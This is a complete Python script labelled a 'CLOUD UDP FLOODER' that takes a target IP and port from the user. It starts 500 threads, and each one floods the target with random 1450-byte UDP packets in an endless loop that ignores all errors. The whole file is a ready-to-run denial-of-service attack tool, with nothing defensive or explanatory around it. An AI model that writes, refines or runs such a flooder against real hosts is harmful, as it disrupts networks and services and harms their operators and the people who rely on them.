import socket
import threading
import random
import os

def attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1450)
    
    while True:
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass

def start_flood():
    print("--- CLOUD UDP FLOODER ---")
    data = input("Target: ")
    
    try:
        target_ip = data.split(":")[0]
        target_port = int(data.split(":")[1])
        
        threads_count = 500 
        
        print(f"[!] Attack: {target_ip}:{target_port} в {threads_count} потоков...")
        
        for i in range(threads_count):
            t = threading.Thread(target=attack, args=(target_ip, target_port))
            t.daemon = True
            t.start()
        
        while True:
            import time
            time.sleep(10)
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    start_flood()
